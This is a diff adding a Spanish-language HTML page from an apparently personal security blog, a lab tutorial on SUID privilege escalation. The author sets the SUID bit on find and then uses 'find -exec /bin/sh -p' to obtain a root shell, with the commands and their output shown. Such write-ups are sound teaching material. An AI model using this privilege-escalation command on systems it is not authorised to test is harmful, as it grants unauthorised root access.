@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Sleepyrazor - Explotación SUIDs</title>
+
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
+    
+    <link rel="stylesheet" href="css/bootstrap4-neon-glow.min.css">
+    
+    
+    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/font-hack/2.020/css/hack.min.css'>
+    
+  </head>
+  <body>
+
+  <div class="navbar-dark text-white">
+    <div class="container">
+      <nav class="navbar px-0 navbar-expand-lg navbar-dark">
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
+          <div class="navbar-nav">
+            <a href="index.html" class="pl-md-0 p-3 text-light">Inicio</a>
+            <a href="app.html" class="p-3 text-decoration-none text-light">Write Ups</a>
+            <a href="form.html" class="p-3 text-decoration-none text-light">Explotaciones</a>
+          </div>
+        </div>
+      </nav>
+
+    </div>
+  </div>
+
+
+  
+
+<div class="jumbotron bg-transparent mb-0 radius-0">
+  <div class="container">
+      <div class="row">
+        <div class="col-xl-6">
+          <h1 class="display-2">Explotación de permisos SUI<span class="vim-caret">D</span></h1>
+          <div class="lead mb-3 text-mono text-success">Preparación del entorno</div>
+          <p class="mt-5 text-grey text-spacey">
+            Lo primero que haremos será asignar un permisos 4755 a un comando, en mi caso el comando find. Para ello usaremos el siguiente comando:
+          </p>
+          <p class="mt-5 text-black text-spacey" style="background-color: rgb(44, 44, 44);">
+            sudo chmod 4755 /usr/bin/find
+          </p>
+          <p class="mt-5 text-grey text-spacey">
+          Quedaría de la siguiente forma:
+          </p>
+          <p class="mt-5 text-black text-spacey" style="background-color: rgb(44, 44, 44);">
+            └─$ -rwsr-xr-x 1 root root 311008 Jan  9 12:36 /usr/bin/find
+          </p>
+          <p class="mt-5 text-grey text-spacey">
+            Como vemos, en el permiso de <strong>usuario</strong>, podemos ver que se ha añadido una <strong>s</strong>. Esta es la que indica que tiene permisos de SUID.
+            Por último, cambiaremos a un usuario que no esté en la lista de sudoers para hacer la prueba.
+            </p>
+
+          <div class="text-darkgrey text-mono my-2">Some muted text</div>
+          <div class="lead mb-3 text-mono text-success">Explotación</div>
+          <p class="mt-5 text-grey text-spacey">
+            Una vez conseguido un comando con SUID, lo siguiente que haremos será explotarlo. En nuestro caso, es el comando <strong>find</strong>.
+            </p>
+            <p class="mt-5 text-grey text-spacey">
+             Para explotar el binario <strong>find</strong>, usaremos la siguiente sentencia:    
+            </p>
+            <p class="mt-5 text-black text-spacey" style="background-color: rgb(44, 44, 44);">
+              cd /usr/bin; ./find . -exec /bin/sh -p \; -quit
+            </p>
+            <p class="mt-5 text-grey text-spacey">
+              Haciendo esto, ejecutaremos un sh mediante el parámetro exec del comando find. Como vemos ahora somos root.    
+             </p>
+             <p class="mt-5 text-black text-spacey" style="background-color: rgb(44, 44, 44);">
+              # whoami
+              </p>
+              <p class="mt-5 text-black text-spacey" style="background-color: rgb(44, 44, 44);">
+              root</p>
+
+          <p class="mt-5 text-grey text-spacey">
+            Con esto, habríamos completado satisfactóriamente la Explotación de Permisos SUID. 
+          </p>
+        </div>
+      </div>
+  </div>
+</div>
+
+
+
+<div class="container py-5">
+  <h1>Info</h1>
+
+  <p>Si encuentras algún error, por favor, ¡no dudes en comentármelo!<br>
+
+    <div class="text-mono">
+      <a href="https://github.com/sleepyrazor/"
+         title="Download Theme"
+         class="btn btn-success btn-shadow px-3 my-2 ml-0 text-left">
+        Visitar mi página principal
+      </a>
+    </div>
+  
+</div>
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+
+  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+
+  </body>
+</html>
